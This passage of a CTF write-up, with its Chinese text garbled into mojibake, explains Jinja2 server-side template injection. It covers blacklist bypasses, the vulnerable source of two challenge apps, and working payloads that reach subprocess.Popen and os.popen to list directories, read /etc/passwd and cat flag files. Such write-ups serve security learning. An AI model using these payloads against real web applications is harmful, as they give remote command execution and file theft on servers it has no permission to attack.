&#125;&#125;&amp;path=/etc/passwd<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;<br></code></pre></td></tr></table></figure><p>é…åˆè®¿é—®æ–¹å¼ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/target/</span><span class="hljs-string">?p</span>ath=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure><h5 id="dict-æ‹¿é”®"><a href="#dict-æ‹¿é”®" class="headerlink" title="dict()  æ‹¿é”®"></a>dict()  æ‹¿é”®</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>] <br><span class="hljs-built_in">str</span>(<span class="hljs-built_in">dict</span>(whoami=<span class="hljs-number">1</span>))[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>] <br><span class="hljs-string">&#x27;whoami&#x27;</span><br></code></pre></td></tr></table></figure><p>payload1:</p><ul><li><code>dict(whoami=1)</code> ä¼šæ„é€ ä¸€ä¸ªå­—å…¸ï¼š<code>&#123;&#39;whoami&#39;: 1&#125;</code></li><li><code>list(...)</code> ä¼šæŠŠå­—å…¸çš„ <strong>é”®</strong> è½¬æ¢æˆåˆ—è¡¨ï¼š<code>[&#39;whoami&#39;]</code></li><li><code>[0]</code> å–ç¬¬ä¸€ä¸ªé”®ï¼Œä¹Ÿå°±æ˜¯ <code>&#39;whoami&#39;</code></li></ul><p>payload2:</p><ul><li><code>dict(whoami=1)</code> è¿˜æ˜¯æ„é€ å­—å…¸ <code>&#123;&#39;whoami&#39;: 1&#125;</code></li><li><code>str(...)</code> è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆæ ¼å¼å¯èƒ½æ˜¯ï¼š<code>&quot;&#123;&#39;whoami&#39;: 1&#125;&quot;</code>ï¼Œæ³¨æ„ä¸åŒ Python ç‰ˆæœ¬å¯èƒ½æœ‰ç©ºæ ¼ï¼‰</li><li><code>[2:8]</code> æ˜¯å­—ç¬¦ä¸²åˆ‡ç‰‡ï¼Œä»ç¬¬3ä¸ªå­—ç¬¦åˆ°ç¬¬8ä¸ªå­—ç¬¦</li></ul><h5 id="str-å’Œ-ç»“åˆ"><a href="#str-å’Œ-ç»“åˆ" class="headerlink" title="str å’Œ [] ç»“åˆ"></a>str å’Œ [] ç»“åˆ</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>(().__class__.__new__)<br></code></pre></td></tr></table></figure><p><code>().__class__</code> â†’ æ˜¯ <code>object</code>ï¼Œå› ä¸º <code>()</code> æ˜¯ä¸ªç©ºå…ƒç»„ï¼Œå…ƒç»„æ˜¯ç±» <code>tuple</code> çš„å®ä¾‹ï¼Œè€Œ <code>tuple</code> çš„åŸºç±»æ˜¯ <code>object</code>ã€‚</p><p><code>().__class__.__new__</code> â†’ å¾—åˆ°çš„æ˜¯ <code>object.__new__</code> è¿™ä¸ªæ–¹æ³•ã€‚</p><p><code>str(...)</code> â†’ æŠŠè¿™ä¸ªæ–¹æ³•å˜æˆå­—ç¬¦ä¸²ï¼ˆé€šå¸¸æ˜¯å…¶æè¿°å½¢å¼ï¼‰ï¼š</p><p>è¾“å‡ºç±»ä¼¼äº: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#&quot;&lt;built-in method __new__ of type object at 0x00007FF8E39F0AF0&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>ç”¨ç´¢å¼• <code>[21]</code>, <code>[13]</code> ç­‰ï¼Œæ˜¯åœ¨å¯¹è¿™ä¸ªå­—ç¬¦ä¸²åš <strong>å­—ç¬¦ç´¢å¼•åˆ‡ç‰‡æ“ä½œ</strong>ï¼Œæ‰‹åŠ¨â€œæ‹¼æ¥â€å­—ç¬¦ä¸² <code>&quot;whoami&quot;</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>(().__class__.__new__)[<span class="hljs-number">21</span>]<br> <span class="hljs-comment">#w</span><br> os.system(<br>    <span class="hljs-built_in">str</span>(().__class__.__new__)[<span class="hljs-number">21</span>]+<span class="hljs-built_in">str</span>(().__class__.__new__)[<span class="hljs-number">13</span><br> )<br> <span class="hljs-comment">#os.system(whoami)</span><br></code></pre></td></tr></table></figure><h4 id="ç©ºæ ¼"><a href="#ç©ºæ ¼" class="headerlink" title="ç©ºæ ¼"></a>ç©ºæ ¼</h4><p>é€šè¿‡ () ã€ [] æ›¿æ¢</p><h4 id="ï¼ˆï¼‰"><a href="#ï¼ˆï¼‰" class="headerlink" title="ï¼ˆï¼‰"></a>ï¼ˆï¼‰</h4><ol><li><p>åˆ©â½¤è£…é¥°å™¨  @ </p></li><li><p>åˆ©â½¤é­”æœ¯â½…æ³•ï¼Œä¾‹å¦‚  <code>enum.EnumMeta.__getitem__ </code> ï¼Œ</p></li><li><p>ä¸€èˆ¬é¢˜ç›®ç›´æ¥è¿‡æ»¤å°æ‹¬å·çš„è¯é‚£å¯ä»¥ç›´æ¥è€ƒè™‘flagåœ¨å½“å‰appçš„ç¯å¢ƒå˜é‡ä¸­äº†</p></li></ol><h2 id="TGCTF2025ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰"><a href="#TGCTF2025ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰" class="headerlink" title="TGCTF2025ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰"></a>TGCTF2025<strong>ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰</strong></h2><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_17-03-17.png" alt="PixPin_2025-07-18_17-03-17"></p><p>æŸ¥çœ‹æºä»£ç è·³è½¬<code>/hint</code>è·¯ç”±ï¼Œç„¶åè·³è½¬åˆ°<code> //aazz</code>è·¯ç”± ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory<br><span class="hljs-keyword">from</span> a.b.c.d.secret <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br><br>black_list=[<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;_.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;arg&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> name.lower():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_typable</span>(<span class="hljs-params">char</span>):<br>    <span class="hljs-comment"># å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›†</span><br>    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace<br>    <span class="hljs-keyword">return</span> char <span class="hljs-keyword">in</span> typable_chars<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/jingu&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">greet</span>():<br>    template1=<span class="hljs-string">&quot;&quot;</span><br>    template2=<span class="hljs-string">&quot;&quot;</span><br>    name = request.form.get(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    template = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">if</span> waf(name):<br>        template = <span class="hljs-string">&#x27;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹</span><br><span class="hljs-string">Image&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        k=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">if</span> is_typable(i):<br>                <span class="hljs-keyword">continue</span><br>            k=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> k==<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (secret_key[:<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> name <span class="hljs-keyword">and</span> secret_key[<span class="hljs-number">2</span>:]):<br>                template = <span class="hljs-string">&#x27;è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§</span><br><span class="hljs-string"></span><br><span class="hljs-string">å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒ</span><br><span class="hljs-string"></span><br><span class="hljs-string">Image&#x27;</span><br>                <span class="hljs-keyword">return</span> render_template_string(template)<br>            template1 = <span class="hljs-string">&quot;â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œ&#123;&#123;&#125;&#125;â€</span><br><span class="hljs-string">æœ€åï¼Œå¦‚æœä½ ç”¨äº†catï¼Œå°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº†</span><br><span class="hljs-string">&quot;</span><br>            template= template.replace(<span class="hljs-string">&quot;å¤©å‘½&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&quot;</span>).replace(<span class="hljs-string">&quot;éš¾è¿&quot;</span>,<span class="hljs-string">&quot;&#125;&#125;&quot;</span>)<br>            template = template<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cat&quot;</span> <span class="hljs-keyword">in</span> template:<br>        template2 = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­ï¼ŒçœŸçš„èƒ½åšåˆ°ï¼Ÿ</span><br><span class="hljs-string"></span><br><span class="hljs-string">Image&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> template1+render_template_string(template)+render_template_string(template2)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        error_message = <span class="hljs-string">f&quot;500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</span><br><span class="hljs-string"><span class="hljs-subst">&#123;template&#125;</span>&quot;</span><br>        <span class="hljs-keyword">return</span> error_message, <span class="hljs-number">400</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hint&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hinter</span>():<br>    template=<span class="hljs-string">&quot;hintï¼š</span><br><span class="hljs-string">æœ‰ä¸€ä¸ªaazzè·¯ç”±ï¼Œå»é‚£é‡Œçœ‹çœ‹å§ï¼Œå¤©å‘½äºº!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/aazz&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finder</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        source_code = f.read()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;</span><br><span class="hljs-string"><span class="hljs-subst">&#123;source_code&#125;</span></span><br><span class="hljs-string">&quot;</span>, <span class="hljs-number">200</span>, &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>é»‘åå•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">black_list=[<span class="hljs-string">&#x27;lipsum&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>,<span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;import&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;read&#x27;</span>,<span class="hljs-string">&#x27;base&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;_.&#x27;</span>,<span class="hljs-string">&#x27;set&#x27;</span>,<span class="hljs-string">&#x27;application&#x27;</span>,<span class="hljs-string">&#x27;getitem&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;arg&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;app&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br></code></pre></td></tr></table></figure><p>éœ€è¦1.ä¸å«é»‘åå•å•è¯2.æ‰€æœ‰å­—ç¬¦å‡ä¸ºå¯æ‰“å°å­—ç¬¦3.åŒ…å«å®Œæ•´<code>secret_key</code>æ‰èƒ½è·å–åˆ°flag</p><p><code>secret_key</code>ä¸º<code>å¤©å‘½</code> <code>éš¾è¿</code>ï¼Œ<code>å¤©å‘½</code>è¢«æ›¿æ¢ä¸º<code>&#123;&#123;`,`éš¾è¿`è¢«æ›¿æ¢ä¸º`&#125;&#125;</code>ã€‚</p><p>æˆ‘ä»¬æœ€åéœ€è¦æŠŠpayloadå†™è¿›<code>å¤©å‘½</code> <code>éš¾è¿</code>ä¹‹é—´ã€‚</p><p>æ„é€ payloadï¼š</p><p>çœ‹æœ‰æ²¡æœ‰å“ªäº›ç±»å¯ä»¥ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">1</span>].__subclasses__()<br></code></pre></td></tr></table></figure><p>wafé‡Œæœ‰<code>._</code>   <code>bases</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[][<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="hljs-string">&quot;\x5f\x5fmro\x5f\x5f&quot;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_17-17-32.png" alt="PixPin_2025-07-18_17-17-32"></p><p><code>subprocess.Popen</code> æ˜¯ä¸€ä¸ªç±»ï¼Œèƒ½æ›´çµæ´»åœ°å¯åŠ¨å­è¿›ç¨‹ï¼š</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_17-26-26.png" alt="PixPin_2025-07-18_17-26-26"></p><p>æŠŠ<code>,</code>æ›¿æ¢æˆ<code>\n</code>å¤åˆ¶åˆ°VScode,</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_17-31-35.png" alt="PixPin_2025-07-18_17-31-35"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯ç¬¬352ä¸ªç±»ã€‚</p><p>[][â€œ\x5f\x5fclass\x5f\x5fâ€]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[][<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="hljs-string">&quot;\x5f\x5fmro\x5f\x5f&quot;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="hljs-number">351</span>]([<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>],stdout=-<span class="hljs-number">1</span>).communicate()[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_17-46-06.png" alt="PixPin_2025-07-18_17-46-06"></p><p>å¯ä»¥çœ‹åˆ°flagæ‰€åœ¨çš„ç›®å½•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ntgffff11111aaaagggggggg<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[][<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="hljs-string">&quot;\x5f\x5fmro\x5f\x5f&quot;</span>][<span class="hljs-number">1</span>][<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="hljs-number">351</span>]([<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;/tgffff11111aaaagggggggg&#x27;</span>],stdout=-<span class="hljs-number">1</span>).communicate()[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_17-46-41.png" alt="PixPin_2025-07-18_17-46-41"></p><p>ä¹Ÿå¯ä»¥ç”¨16è¿›åˆ¶å’Œ<code>[]</code>ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">å¤©å‘½()[<span class="hljs-string">&#x27;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#x27;</span>][<span class="hljs-string">&#x27;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&#x27;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#x27;</span>]()[<span class="hljs-number">132</span>][<span class="hljs-string">&#x27;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#x27;</span>][<span class="hljs-string">&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;</span>][<span class="hljs-string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>)[<span class="hljs-string">&quot;\x72\x65\x61\x64&quot;</span>]()éš¾è¿<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">å¤©å‘½()[<span class="hljs-string">&#x27;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#x27;</span>][<span class="hljs-string">&#x27;\x5f\x5f\x62\x61\x73\x65\x73\x5f\x5f&#x27;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&#x27;</span>]()[<span class="hljs-number">132</span>][<span class="hljs-string">&#x27;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&#x27;</span>][<span class="hljs-string">&#x27;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&#x27;</span>][<span class="hljs-string">&#x27;\x70\x6f\x70\x65\x6e&#x27;</span>](<span class="hljs-string">&#x27;cat /tgffff11111aaaagggggggg&#x27;</span>)[<span class="hljs-string">&quot;\x72\x65\x61\x64&quot;</span>]()éš¾è¿<br><br></code></pre></td></tr></table></figure><h2 id="polarCTF-ghost-render"><a href="#polarCTF-ghost-render" class="headerlink" title="polarCTF ghost_render"></a>polarCTF ghost_render</h2><p>é¢˜ç›®å†™äº†æ¸²æŸ“å†ä¸Šä¼ åˆ°,mdé‡Œå†™<code>&#123;&#123;7*7&#125;&#125;</code>,ç•Œé¢æ¸²æŸ“ç»“æœæ˜¯49</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_17-57-47.png" alt="PixPin_2025-07-18_17-57-47"></p><p>æŠ“åŒ…ç›´æ¥ä¼ <code>&#123;&#123;[].__class__.__bases__[0].subclasses__()&#125;&#125;</code></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_18-00-54.png" alt="PixPin_2025-07-18_18-00-54"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬280ä¸ªç±»æ˜¯ï¼šsubprocess</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_18-05-50.png" alt="PixPin_2025-07-18_18-05-50"></p><p>[][â€œ\x5f\x5fclass\x5f\x5fâ€]</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fmro\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]</span>()<span class="hljs-selector-attr">[279]</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]</span>,stdout=-<span class="hljs-number">1</span>)<span class="hljs-selector-class">.communicate</span>()<span class="hljs-selector-attr">[0]</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_18-09-31.png" alt="PixPin_2025-07-18_18-09-31"></p><p>æ ¹ç›®å½•ä¸‹æ²¡æœ‰ï¼Œåœ¨<code>/var</code>é‡Œé¢ï¼š</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_18-11-03.png" alt="PixPin_2025-07-18_18-11-03"></p><p>flagåœ¨<code>/var/secret_flag</code></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-18_19-54-16.png" alt="PixPin_2025-07-18_19-54-16"></p><p>åœ¨è¿™ç¯‡é‡Œå‘ç°äº†å¦ä¸€ä¸ªå¯ç”¨çš„payload[æœ‰æ•ˆè½½è·&#x2F;æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥&#x2F;python.mdåœ¨ä¸»äººÂ·swisskyrepo&#x2F;paryloadsallthethingsÂ·github](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server</a> Side Template Injection&#x2F;Python.md?ref&#x3D;blog.qz.sg#jinja2â€”remote-command-execution)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; lipsum.__globals__[<span class="hljs-string">&quot;os&quot;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read() &#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123; lipsum.__globals__[<span class="hljs-string">&quot;os&quot;</span>].popen(<span class="hljs-string">&#x27;ls /var&#x27;</span>).read() &#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-09_14-04-59.png" alt="PixPin_2025-07-09_14-04-59"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 